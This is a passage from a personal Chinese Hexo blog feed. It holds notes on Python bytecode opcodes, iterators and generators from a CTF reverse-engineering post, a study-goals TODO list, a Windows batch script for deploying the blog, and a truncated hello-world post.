指令用于在条件判断为真时跳转到指定的位置。在字节码中，<code>JUMP_ABSOLUTE</code> 的目标是跳转到指定的绝对位置，绕过相应的代码块。</p><h4 id="运算指令"><a href="#运算指令" class="headerlink" title="运算指令"></a>运算指令</h4><ol><li><strong>BINARY_ADD</strong>: 从堆栈中弹出两个值，相加，并将结果推回堆栈。</li><li><strong>BINARY_SUBTRACT</strong>: 从堆栈中弹出两个值，相减，并将结果推回堆栈。</li><li><strong>BINARY_MULTIPLY</strong>: 从堆栈中弹出两个值，相乘，并将结果推回堆栈。</li><li><strong>BINARY_DIVIDE</strong>: 从堆栈中弹出两个值，相除，并将结果推回堆栈。</li><li><strong>BINARY_MODULO</strong>: 从堆栈中弹出两个值，取模，并将结果推回堆栈。</li><li><strong>BINARY_POWER</strong>: 从堆栈中弹出两个值，计算幂，并将结果推回堆栈。</li><li><strong>BINARY_LSHIFT</strong>: 将堆栈顶部的值左移指定位数，并将结果推回堆栈。</li><li><strong>BINARY_RSHIFT</strong>: 将堆栈顶部的值右移指定位数，并将结果推回堆栈。</li><li><strong>BINARY_AND</strong>: 从堆栈中弹出两个值，进行按位与操作，并将结果推回堆栈。</li><li><strong>BINARY_OR</strong>: 从堆栈中弹出两个值，进行按位或操作，并将结果推回堆栈。</li><li><strong>BINARY_XOR</strong>: 从堆栈中弹出两个值，进行按位异或操作，并将结果推回堆栈。</li><li><strong>INPLACE_ADD</strong>: 从堆栈中弹出两个值，相加，并将结果就地存储回栈顶的位置。</li><li><strong>INPLACE_SUBTRACT</strong>: 从堆栈中弹出两个值，相减，并将结果就地存储回栈顶的位置。</li><li><strong>INPLACE_MULTIPLY</strong>: 从堆栈中弹出两个值，相乘，并将结果就地存储回栈顶的位置。</li><li><strong>INPLACE_DIVIDE</strong>: 从堆栈中弹出两个值，相除，并将结果就地存储回栈顶的位置。</li></ol><h4 id="比较指令COMPARE-OP"><a href="#比较指令COMPARE-OP" class="headerlink" title="比较指令COMPARE_OP"></a>比较指令<code>COMPARE_OP</code></h4><ul><li><p><code>COMPARE_OP</code> 是 Python 字节码的一种指令，用于执行比较操作。它弹出两个值，执行指定的比较操作，然后将比较结果的布尔值推送回堆栈。</p><p>以下是关于 <code>COMPARE_OP</code> 指令的一些细节：</p><ul><li><strong>指令名称：</strong> <code>COMPARE_OP</code></li><li><strong>Opcode：</strong> <code>0x6E</code></li><li><strong>参数：</strong> 一个表示比较操作类型的整数码（具体的操作由该参数确定）</li></ul><p><code>COMPARE_OP</code> 的作用是执行两个值之间的比较操作，比较操作的类型由参数确定。这可以是诸如等于、不等于、小于、大于等操作。</p><p>比较操作的参数码和对应的比较操作如下：</p><ul><li><code>0</code>: <code>&lt;</code> （小于）</li><li><code>1</code>: <code>&lt;=</code> （小于等于）</li><li><code>2</code>: <code>==</code> （等于）</li><li><code>3</code>: <code>!=</code> （不等于）</li><li><code>4</code>: <code>&gt;</code> （大于）</li><li><code>5</code>: <code>&gt;=</code> （大于等于）</li><li><code>6</code>: <code>in</code> （成员测试）</li><li><code>7</code>: <code>not in</code> （不是成员测试）</li><li><code>8</code>: <code>is</code> （同一对象测试）</li><li><code>9</code>: <code>is not</code> （不是同一对象测试）</li><li><code>10</code>: <code>exception match</code> （异常匹配）</li><li><code>11</code>: <code>BAD</code> （无效的比较）</li></ul><p>示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 比较操作: a &lt; b</span></span><br><span class="line">a = <span class="number">5</span></span><br><span class="line">b = <span class="number">10</span></span><br><span class="line">result = a &lt; b</span><br></pre></td></tr></table></figure><p>对应的字节码可能包含：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span> LOAD_CONST               <span class="number">1</span> (<span class="number">5</span>)</span><br><span class="line"><span class="number">2</span> LOAD_CONST               <span class="number">2</span> (<span class="number">10</span>)</span><br><span class="line"><span class="number">4</span> COMPARE_OP               <span class="number">0</span> (&lt;)  <span class="comment"># 执行 a &lt; b 的比较操作</span></span><br></pre></td></tr></table></figure><p>在这个例子中，<code>COMPARE_OP</code> 指令执行了小于（<code>&lt;</code>）的比较操作，将结果推送回堆栈。</p></li></ul><h4 id="用户输入"><a href="#用户输入" class="headerlink" title="用户输入"></a>用户输入</h4><p>在 Python 2 中，使用 <code>raw_input</code> 函数来接收用户的输入。<code>raw_input</code> 会将用户输入的内容作为字符串返回，不进行任何解析或转换。</p><p>从 Python 3 开始，<code>raw_input</code> 被移除，而 <code>input</code> 函数则获得了与 Python 2 中的 <code>raw_input</code> 类似的行为，即将用户输入的内容作为字符串返回。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231115174715910.png" alt="image-20231115174715910"></p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231115174729372.png" alt="image-20231115174729372"></p><h3 id="yield关键字"><a href="#yield关键字" class="headerlink" title="yield关键字"></a>yield关键字</h3><p>首先了解一下python迭代器</p><h4 id="python迭代器"><a href="#python迭代器" class="headerlink" title="python迭代器"></a>python迭代器</h4><p>迭代器有两个重要函数  <br /><code>iter()</code> 用于创建一个迭代器（所有的序列都可以转化为迭代器）。 <br /><code>next()</code>可以返回迭代器的下一元素。若迭代器数据耗尽时仍然调用next()函数，则会引发StopIteration异常。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span> = [<span class="number">1</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">it = <span class="built_in">iter</span>(<span class="built_in">list</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">​    <span class="built_in">print</span> (<span class="built_in">next</span>(it),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">except</span> StopIteration:</span><br><span class="line"></span><br><span class="line">​    sys.exit()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231119151901373.png" alt="image-20231119151901373"></p><p><a href="https://www.runoob.com/python3/python3-iterator-generator.html">Python3 迭代器与生成器 | 菜鸟教程 (runoob.com)</a></p><h4 id="yield"><a href="#yield" class="headerlink" title="yield"></a>yield</h4><p>在 Python 中，使用了 <strong>yield</strong> 的函数被称为生成器（generator）。<br/></p><p>生成器是一个返回迭代器的函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fibonacci</span>(<span class="params">n</span>): <span class="comment"># 生成器函数 - 斐波那契</span></span><br><span class="line">    a, b, counter = <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> (counter &gt; n): </span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">yield</span> a</span><br><span class="line">        a, b = b, a + b <span class="comment">#b赋值给a，a+b赋值给b,可以不使用中间变量，简化了编程。</span></span><br><span class="line">        counter += <span class="number">1</span></span><br><span class="line">f = fibonacci(<span class="number">10</span>) <span class="comment"># f 是一个迭代器，由生成器返回生成</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="built_in">next</span>(f), end=<span class="string">&quot; &quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> StopIteration:</span><br><span class="line">        sys.exit()</span><br></pre></td></tr></table></figure><p>生成器函数的优势是它们可以按需生成值，避免一次性生成大量数据并占用大量内存。此外，生成器还可以与其他迭代工具（如for循环）无缝配合使用，提供简洁和高效的迭代方式。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> re </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TODO</title>
      <link href="/2023/09/18/target/TODO/"/>
      <url>/2023/09/18/target/TODO/</url>
      
        <content type="html"><![CDATA[<h4 id="0x5"><a href="#0x5" class="headerlink" title="0x5"></a>0x5</h4><ul><li><p>TinyWebServer</p><ul><li><p>2024/5/1 ~ 2024/5/2 完成Buffer</p></li><li><p>2024/5/3 ~ 2024/5/4 完成log</p></li><li><p>2024/5/4 ~ 2024/5/5 完成pool</p></li><li><p>2024/5/5 完成heap</p></li><li><p>2024/5/6 ~ 2024/5/10 完成 http</p></li><li><p>2024/5/12 ~ 2024/5/12 完成 webserver</p></li><li><p>2024/5/13 ~ 2024/5/14 完成总结</p></li></ul></li></ul><ul><li><p>2024/5/15 ~ 2024/5/18 做些算法题，摸鱼</p></li><li><p>2024/5/18 ，刚刚配好xv6环境，可能要在暑假才能开始学习</p></li><li><p>2024/5/19 ~ 2024/6/24 好多事忙ಥ_ಥ，后面还生病躺了几天</p></li></ul><h4 id="0x6"><a href="#0x6" class="headerlink" title="0x6"></a>0x6</h4><ul><li>2024/6/24  ~ 2024/6/27       csapp malloc lab+总结</li><li>2024/6/28 ~           xv6，启动！！！</li></ul><h4 id="0x7"><a href="#0x7" class="headerlink" title="0x7"></a>0x7</h4><ul><li>2024/7/1 ~ 2024/7/31  acm集训</li><li>2024/7/1 ~ 2024/7/21  xv6 lab基本完成</li><li>2024/7/22~2024/8/1     javascript + vue3 学习</li></ul><h4 id="0x8"><a href="#0x8" class="headerlink" title="0x8"></a>0x8</h4><ul><li>2024/8/1 ~ 2024/8/9     acm集训</li><li>2024/8/1 ~ 2024/8/8         golang学习</li><li>2024/8/5 ~ 2024/8             pr学习</li></ul>]]></content>
      
      
      <categories>
          
          <category> target&amp;TODO </category>
          
      </categories>
      
      
        <tags>
            
            <tag> target&amp;TODO </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023——∞</title>
      <link href="/2023/09/18/target/target/"/>
      <url>/2023/09/18/target/target/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">&gt;要么努力到出类拔萃，要么懒到乐天之命，最怕你见识打开了，可努力又跟不上，骨子里清高至极，性格上软弱无比，其实你一直都知道自己哪里不好，但你懒得去改，不是拖延就是逃避，你总是处在卷又卷不动，躺也躺不赢的状态里，一直清醒的看着自己沉沦，努力跟不上见识，行动跟不上思想，正如那句话所说，我深知自己本非美玉，故而不敢加以刻苦琢磨，却又半信自己是块美玉，故又不肯庸庸碌碌与瓦砾为伍，在清高中与软弱中徘徊，在努力与堕落中纠结，可只要你想改变，时间永远不晚，慢慢自救叭，在没有彻底沉沦之前。</span><br><span class="line">&gt;</span><br><span class="line">&gt;--2023/12/16</span><br><span class="line"></span><br><span class="line"># R@nd01f1u0</span><br><span class="line"></span><br><span class="line">&#123;% note blue &#x27;fas fa-bullhorn&#x27; simple %&#125;</span><br><span class="line"></span><br><span class="line">尽量独立思考</span><br><span class="line"></span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;% note red &#x27;fas fa-bullhorn&#x27; simple %&#125;</span><br><span class="line"></span><br><span class="line">专心对待每一件事</span><br><span class="line"></span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note orange &#x27;fas fa-bullhorn&#x27; simple %&#125;</span><br><span class="line"></span><br><span class="line">爱自己以及家人，朋友</span><br><span class="line"></span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note green &#x27;fas fa-bullhorn&#x27; simple %&#125;</span><br><span class="line"></span><br><span class="line">不要给自己制造焦虑。睡过了也没关系，这代表你充分休息了；比不过别人也没关系，因为别人在你娱乐的时候学习；他收获了知识，你收获了快乐。如果连娱乐都伴随者焦虑，就什么事都办不成了。在学习与娱乐中找到平衡，在大部分时间学习，在少部分时间娱乐，</span><br><span class="line"></span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">## 2023 </span><br><span class="line"></span><br><span class="line">### C++ 学习</span><br><span class="line"></span><br><span class="line">ing</span><br><span class="line"></span><br><span class="line">### 英语四级</span><br><span class="line"></span><br><span class="line">少年祈祷中    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt; 四级核心词汇</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;% timeline 2023,green %&#125;</span><br><span class="line">&lt;!-- timeline 10-02 --&gt;</span><br><span class="line">170/2173</span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- timeline 10-22 --&gt;</span><br><span class="line">594/2173</span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- timeline 11-16 --&gt;</span><br><span class="line">922/2173</span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- timeline 12-16 --&gt;</span><br><span class="line">1456/2173</span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- timeline 12-30 --&gt;</span><br><span class="line">2173/2173</span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line"></span><br><span class="line">&#123;% endtimeline %&#125;</span><br><span class="line"></span><br><span class="line">完成的第一项traget！</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 2024</span><br><span class="line"></span><br><span class="line">#### //TODO</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">##### English grammar&amp;&amp;English Vocabulary</span><br><span class="line"></span><br><span class="line">&gt; 寒假学会语法，早日背完红宝书！</span><br><span class="line"></span><br><span class="line">##### CSAPP学习</span><br><span class="line"></span><br><span class="line">&gt; 学习剩下的部分，做完所有lab，做总结!</span><br><span class="line"></span><br><span class="line">##### Guitar</span><br><span class="line"></span><br><span class="line">&gt; 重拾吉他吧，少年!</span><br><span class="line"></span><br><span class="line">##### C++学习</span><br><span class="line"></span><br><span class="line">&gt; 重新学习。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">##### ACM</span><br><span class="line"></span><br><span class="line">&gt; 学习一下算法。</span><br><span class="line"></span><br><span class="line">##### 单片机</span><br><span class="line"></span><br><span class="line">&gt;51单片机快速过完，stm32打好基础</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">##### 操作系统</span><br><span class="line"></span><br><span class="line">&gt; xv6 </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">##### mit6.824</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> target&amp;TODO </category>
          
      </categories>
      
      
        <tags>
            
            <tag> target&amp;TODO </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用bat快速上传博客</title>
      <link href="/2023/09/17/bat/bat/"/>
      <url>/2023/09/17/bat/bat/</url>
      
        <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/DY_1024/article/details/83094915">Windows批处理文件（.bat文件和.cmd文件）介绍以及简单使用_windows批处理文件是什么意思_Gary的面包屑小道的博客-CSDN博客</a></p><h2 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h2><h3 id="echo：显示信息"><a href="#echo：显示信息" class="headerlink" title="echo：显示信息"></a>echo：显示信息</h3><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> hello   //在终端打印hello</span><br></pre></td></tr></table></figure><h3 id="echo-off"><a href="#echo-off" class="headerlink" title="@echo off"></a>@echo off</h3><p><a href="https://blog.csdn.net/Fly_as_tadpole/article/details/85177379">Windows下的bat文件的@echo off 作用？_五山口老法师的博客-CSDN博客</a></p><p>命令叫做“回显”</p><p>添加上这条语句后，就不会将文件内容打印到终端上.</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">ECHO</span> OFF</span><br><span class="line"><span class="built_in">ECHO</span> hello1</span><br><span class="line"><span class="built_in">ECHO</span> hello12</span><br><span class="line"><span class="built_in">ECHO</span> hello1234</span><br><span class="line"><span class="built_in">ECHO</span> hello12345</span><br><span class="line"><span class="built_in">ECHO</span> hello123456</span><br><span class="line"><span class="built_in">ECHO</span> Randolfluo</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">PAUSE</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20230917105824181.png" alt="image-20230917105824181"></p><p>修改文件内容，去掉@符号</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ECHO</span> OFF</span><br><span class="line"><span class="built_in">ECHO</span> hello1</span><br><span class="line"><span class="built_in">ECHO</span> hello12</span><br><span class="line"><span class="built_in">ECHO</span> hello1234</span><br><span class="line"><span class="built_in">ECHO</span> hello12345</span><br><span class="line"><span class="built_in">ECHO</span> hello123456</span><br><span class="line"><span class="built_in">ECHO</span> Randolfluo</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">PAUSE</span></span><br></pre></td></tr></table></figure><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20230917105926577.png" alt="image-20230917105926577"></p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">::<span class="built_in">ECHO</span> OFF     //注释掉<span class="built_in">ECHO</span> OFF 指令</span><br><span class="line"><span class="built_in">ECHO</span> hello1</span><br><span class="line"><span class="built_in">ECHO</span> hello12</span><br><span class="line"><span class="built_in">ECHO</span> hello1234</span><br><span class="line"><span class="built_in">ECHO</span> hello12345</span><br><span class="line"><span class="built_in">ECHO</span> hello123456</span><br><span class="line"><span class="built_in">ECHO</span> Randolfluo</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">PAUSE</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20230917110401147.png" alt="image-20230917110401147"></p><p>@echo off表示执行了这条命令后关闭所有命令(包括本身这条命令)的回显。</p><p>@的作用就是关闭其后命令的回显。</p><p>而echo off命令则表示关闭其他所有命令(不包括本身这条命令)的回显。</p><p>ECHO详细用法：<a href="https://blog.51cto.com/u_15162069/2736193#:~:text=windows中echo的用法 1.echo：显示信息,2.echo on%2Foff：开%2F关回显功能 3.输出信息至文件">windows中echo的用法_51CTO博客_windows echo</a></p><h3 id="REM-和"><a href="#REM-和" class="headerlink" title="REM 和 ::"></a>REM 和 ::</h3><p>注释语句</p><p>::设置cmd窗口字体颜色为3，  在cmd中输入命令  color /？ 查看颜色列表</p><p>博客便捷管理批处理文件</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">ECHO</span> OFF</span><br><span class="line"><span class="built_in">cd</span> C:\Users\RandolfluoPC\Desktop\randolfluoblog</span><br><span class="line"><span class="built_in">color</span> <span class="number">3</span>   </span><br><span class="line"><span class="built_in">ECHO</span>    ##########----------~~~~~~~~~~~~~~~~~~~~~~~~~~~~~   Randolfluo   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~----------##########</span><br><span class="line"><span class="built_in">ECHO</span>.</span><br><span class="line"><span class="built_in">ECHO</span>.</span><br><span class="line">:again</span><br><span class="line"><span class="built_in">echo</span> ---------------------------------------</span><br><span class="line"><span class="built_in">echo</span> number = s           Local generation</span><br><span class="line"><span class="built_in">echo</span> number = gd          Upload to github</span><br><span class="line"><span class="built_in">echo</span> number = others      <span class="keyword">exit</span></span><br><span class="line"><span class="built_in">echo</span> ---------------------------------------</span><br><span class="line"><span class="built_in">echo</span> please enter your choice:</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> /p num=</span><br><span class="line"><span class="keyword">if</span> &quot;<span class="variable">%num%</span>&quot;==&quot;s&quot; (</span><br><span class="line"><span class="built_in">start</span> http://localhost:<span class="number">4000</span>/</span><br><span class="line">hexo s</span><br><span class="line"><span class="built_in">PAUSE</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">if</span> &quot;<span class="variable">%num%</span>&quot;==&quot;gd&quot; (</span><br><span class="line">hexo g &amp;&amp; hexo d</span><br><span class="line"><span class="built_in">PAUSE</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> bat </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hello</title>
      <link href="/2023/04/28/Hello/hello/"/>
      <url>/2023/04/28/Hello/hello/</url>
      
        <content type="html"><![CDATA[<h2 id="Hello-hexo"><a href="#Hello-hexo" class="headerlink" title="Hello hexo"></a>Hello hexo</h2><h3 id="this-is-code"><a href="#this-is-code" class="headerlink" title="this is code"></a>this is code</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Javahelloworld</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello hexo\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="这是图片测试"><a href="#这是图片测试" class="headerlink" title="这是图片测试"></a>这是图片测试</h2><p><img src="https://img.gejiba.com/images/f378be6c7dcb686abbd93c1e470ccdc1.gif" alt="图片测试"></p><p>这是标签外挂</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span 